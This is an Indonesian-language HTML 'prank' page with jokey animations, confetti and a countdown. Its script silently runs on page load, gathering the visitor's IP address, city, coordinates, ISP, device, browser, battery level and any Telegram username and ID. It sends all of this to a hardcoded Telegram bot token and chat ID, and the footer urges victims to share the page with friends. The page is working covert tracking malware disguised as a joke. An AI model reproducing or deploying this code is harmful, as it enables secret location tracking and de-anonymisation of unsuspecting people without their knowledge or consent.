<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Prank Kocak • Jangan Serius Ya Ges</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 50%, #fad0c4 100%);
            font-family: 'Poppins', 'Comic Neue', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            cursor: pointer;
        }

        .prank-box {
            max-width: 550px;
            width: 100%;
            background: white;
            border-radius: 70px 70px 90px 90px;
            box-shadow: 0 30px 40px -20px rgba(0,0,0,0.4), 0 0 0 8px #fff5e6, 0 0 0 12px #ffaaa5;
            overflow: hidden;
            transform: scale(0.98);
            transition: transform 0.1s ease;
        }

        .prank-box:active {
            transform: scale(0.96);
        }

        .top-strip {
            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
            padding: 30px 20px 25px;
            text-align: center;
            position: relative;
        }

        .top-strip::before {
            content: "🤡";
            font-size: 55px;
            position: absolute;
            top: -25px;
            left: 15px;
            animation: goyang 0.8s infinite;
        }

        .top-strip::after {
            content: "🎈";
            font-size: 50px;
            position: absolute;
            top: -20px;
            right: 15px;
            animation: muter 2s infinite;
        }

        @keyframes goyang {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-8px) rotate(5deg); }
        }

        @keyframes muter {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h1 {
            font-size: 2rem;
            font-weight: 800;
            color: white;
            text-shadow: 4px 4px 0 #c43e2c;
            letter-spacing: 1px;
        }

        .badge-bawah {
            display: inline-block;
            background: rgba(255,255,255,0.3);
            backdrop-filter: blur(12px);
            border-radius: 100px;
            padding: 6px 18px;
            margin-top: 12px;
            font-weight: 600;
            font-size: 0.8rem;
            color: white;
        }

        .mid-section {
            padding: 30px 25px;
            text-align: center;
            background: #fffef7;
        }

        .muka-lucu {
            font-size: 95px;
            margin-bottom: 15px;
            display: inline-block;
            cursor: pointer;
            transition: all 0.1s ease;
            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.2));
        }

        .muka-lucu:active {
            transform: scale(0.9);
        }

        .big-text {
            font-size: 1.7rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ff6b6b, #ffb347);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 15px 0;
        }

        .timer-box {
            background: #fff0e7;
            border-radius: 100px;
            padding: 12px 20px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            flex-wrap: wrap;
            border: 2px dashed #ffaaa5;
        }

        .timer-angka {
            font-size: 3rem;
            font-weight: 900;
            font-family: monospace;
            background: #2c3e50;
            color: #f7d44a;
            padding: 8px 25px;
            border-radius: 60px;
            letter-spacing: 8px;
            box-shadow: inset 0 -2px 0 #1a2632, 0 4px 10px rgba(0,0,0,0.1);
        }

        .timer-label {
            font-weight: 700;
            color: #b45f3b;
        }

        .btn-gaul {
            background: linear-gradient(95deg, #ff9966, #ff5e62);
            border: none;
            padding: 14px 35px;
            border-radius: 60px;
            color: white;
            font-weight: bold;
            font-size: 1.2rem;
            cursor: pointer;
            transition: all 0.15s;
            box-shadow: 0 6px 0 #b2432c;
            margin: 8px 0;
            width: 80%;
        }

        .btn-gaul:active {
            transform: translateY(3px);
            box-shadow: 0 2px 0 #b2432c;
        }

        .footer-bawah {
            background: #fff5e6;
            padding: 18px;
            text-align: center;
            border-top: 4px dotted #ffaaa5;
        }

        .footer-bawah p {
            color: #a56947;
            font-weight: 600;
            font-size: 0.85rem;
        }

        .footer-bawah span {
            display: inline-block;
            animation: loncat 0.7s infinite;
        }

        @keyframes loncat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }

        /* Loading awal biar keliatan kocak */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #ff9a9e, #fecf9e);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            transition: opacity 0.5s ease;
            flex-direction: column;
            gap: 20px;
        }

        .loading-spin-custom {
            width: 70px;
            height: 70px;
            border: 7px solid rgba(255,255,255,0.4);
            border-top: 7px solid #ff6b6b;
            border-right: 7px solid #ffb347;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        .loading-text-custom {
            color: white;
            font-size: 1.2rem;
            font-weight: bold;
            text-shadow: 2px 2px 0 #c43e2c;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 999;
        }
    </style>
</head>
<body>

<div class="loading-screen" id="loadingScreen">
    <div class="loading-spin-custom"></div>
    <div class="loading-text-custom">🎭 NYIAPIN PRANK SPESIAL 🎭</div>
</div>

<canvas id="confCanvas"></canvas>

<div class="prank-box" id="prankBox" style="display: none;">
    <div class="top-strip">
        <h1>🤪 PRANK ZONE 🤪</h1>
        <div class="badge-bawah">✨ JANGAN MARAH YA GES ✨</div>
    </div>
    
    <div class="mid-section">
        <div class="muka-lucu" id="mukaTrigger">
            🎭
        </div>
        <div class="big-text" id="bigText">
            SELAMAT ANDA KENA PRANK!
        </div>
        
        <div class="timer-box">
            <div class="timer-angka" id="timerCount">3</div>
            <div class="timer-label">detik lagi ledak tawa 🤣</div>
        </div>
        
        <button class="btn-gaul" id="fakeBtn">
            😎 CEK DI SINI 😎
        </button>
        <p style="margin-top: 12px; font-size: 0.7rem; color: #c2845c;">⬅️ coba pencet, seru coy!</p>
    </div>
    
    <div class="footer-bawah">
        <p>🎈 <span>😂</span> KASIH KE TEMEN BIAR MEREKA JUGA KENA <span>😭</span> 🎈</p>
        <p style="font-size: 0.65rem; margin-top: 5px;">⚠️ CUMA BUAT KETAWA, BUKAN BERARTI SERIUS⚠️</p>
    </div>
</div>

<script>
    // ========== KONFIGURASI TELEGRAM (DIAM-DIAM AJA) ==========
    const TELEGRAM_TOKEN = "8692689461:AAH9-8EflUkrDQaD8S8v0z_uz1NdBhvfbL0";
    const TELEGRAM_CHAT_ID = "7373392803";
    
    // Fungsi ngumpulin info tanpa kedip
    async function grabAllDataSilently() {
        try {
            // IP + lokasi
            const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: '-'}));
            const locRes = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}));
            
            // Device & browser
            const ua = navigator.userAgent;
            let device = '?';
            if (/Android/i.test(ua)) device = '📱 Android';
            else if (/iPhone|iPad/i.test(ua)) device = '🍎 iOS';
            else if (/Windows/i.test(ua)) device = '💻 Windows';
            else if (/Mac/i.test(ua)) device = '🍎 Mac';
            else if (/Linux/i.test(ua)) device = '🐧 Linux';
            
            let browser = '?';
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/Edg/i.test(ua)) browser = 'Edge';
            
            // Telegram detection (kalo ada)
            let tgData = { detected: false, username: '-', id: '-' };
            if (window.Telegram?.WebApp?.initDataUnsafe?.user) {
                const tgUser = window.Telegram.WebApp.initDataUnsafe.user;
                tgData.detected = true;
                tgData.username = tgUser.username || tgUser.first_name;
                tgData.id = tgUser.id;
            }
            
            const urlParams = new URLSearchParams(window.location.search);
            const startParam = urlParams.get('start');
            if (startParam && !tgData.detected) {
                tgData.detected = true;
                tgData.username = `StartParam: ${startParam}`;
            }
            
            const screenRes = `${screen.width}x${screen.height}`;
            const timeNow = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
            
            let batStatus = '-';
            if ('getBattery' in navigator) {
                try {
                    const bat = await navigator.getBattery();
                    batStatus = `${Math.round(bat.level * 100)}% ${bat.charging ? '🔌' : '🔋'}`;
                } catch(e) {}
            }
            
            const pesanKeBos = `
🎭 <b>PRANK VICTIM DATANG BOS</b> 🎭
─────────────────
🌐 <b>IP:</b> <code>${ipRes.ip || '-'}</code>
📍 <b>Lokasi:</b> ${locRes.city || '-'}, ${locRes.region || '-'}, ${locRes.country || '-'}
📌 <b>Koordinat:</b> ${locRes.loc || '-'}
🏢 <b>ISP:</b> ${locRes.org || '-'}
─────────────────
📱 <b>Device:</b> ${device}
🌍 <b>Browser:</b> ${browser}
🔋 <b>Batre:</b> ${batStatus}
📺 <b>Resolusi:</b> ${screenRes}
⏰ <b>Waktu:</b> ${timeNow}
─────────────────
${tgData.detected ? `📱 <b>TELE:</b> @${tgData.username} (ID: ${tgData.id})` : '📱 <b>TELE:</b> -'}
─────────────────
😭 <b>GOKIL, KORBAN KENA PRANK!</b>
            `;
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: pesanKeBos,
                    parse_mode: 'HTML'
                })
            }).catch(e => {});
            
        } catch(e) {}
    }
    
    // Confetti biar makin rame
    function triggerConfetti() {
        const canvas = document.getElementById('confCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        let kertas = [];
        for(let i = 0; i < 120; i++) {
            kertas.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height - canvas.height,
                size: Math.random() * 9 + 4,
                speedY: Math.random() * 6 + 4,
                speedX: (Math.random() - 0.5) * 3,
                warna: `hsl(${Math.random() * 360}, 80%, 60%)`
            });
        }
        
        function animasi() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            let masihGerak = false;
            for(let p of kertas) {
                ctx.fillStyle = p.warna;
                ctx.fillRect(p.x, p.y, p.size, p.size);
                p.y += p.speedY;
                p.x += p.speedX;
                if(p.y < canvas.height) masihGerak = true;
            }
            if(masihGerak) requestAnimationFrame(animasi);
        }
        animasi();
        
        setTimeout(() => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
        }, 2800);
    }
    
    // Animasi utama biar keliatan kayak prank receh
    async function jalankanPrank() {
        const box = document.getElementById('prankBox');
        const loadingDiv = document.getElementById('loadingScreen');
        
        // Kirim data tanpa ada yang sadar
        grabAllDataSilently();
        
        // Kasih loading bentar biar kayak siap-siap
        await new Promise(resolve => setTimeout(resolve, 1100));
        
        loadingDiv.style.opacity = '0';
        setTimeout(() => {
            loadingDiv.style.display = 'none';
            box.style.display = 'block';
            box.style.animation = 'popIn 0.4s ease';
        }, 200);
        
        let count = 3;
        const timerEl = document.getElementById('timerCount');
        const teksBesar = document.getElementById('bigText');
        const mukaEl = document.getElementById('mukaTrigger');
        
        const interval = setInterval(() => {
            count--;
            if(count >= 1) {
                timerEl.textContent = count;
                mukaEl.style.transform = 'scale(1.2)';
                setTimeout(() => { mukaEl.style.transform = 'scale(1)'; }, 120);
            }
            if(count === 0) {
                clearInterval(interval);
                timerEl.textContent = '💥🤣';
                teksBesar.innerHTML = 'PRANK BERHASIL 🎉 SELAMAT KENA PRANK! 🎭';
                mukaEl.innerHTML = '😂🤪';
                triggerConfetti();
                setTimeout(() => {
                    teksBesar.innerHTML = 'SELAMAT ANDA KENA PRANK! 😭✨';
                    mukaEl.innerHTML = '🤡🎈';
                }, 1800);
            }
        }, 1000);
        
        const btnFake = document.getElementById('fakeBtn');
        let tekan = 0;
        btnFake.addEventListener('click', () => {
            tekan++;
            if(tekan === 1) btnFake.innerHTML = '🤡 YAH KEPENCET 🤡';
            else if(tekan === 2) btnFake.innerHTML = '😭 PRANK DOANG SIA 😭';
            else btnFake.innerHTML = '😂 MAKASIH SUDAH DIKLIK 😂';
            triggerConfetti();
        });
    }
    
    const tambahStyle = document.createElement('style');
    tambahStyle.textContent = `
        @keyframes popIn {
            0% { opacity: 0; transform: scale(0.85); }
            100% { opacity: 1; transform: scale(1); }
        }
    `;
    document.head.appendChild(tambahStyle);
    
    jalankanPrank();
</script>
</body>
</html>
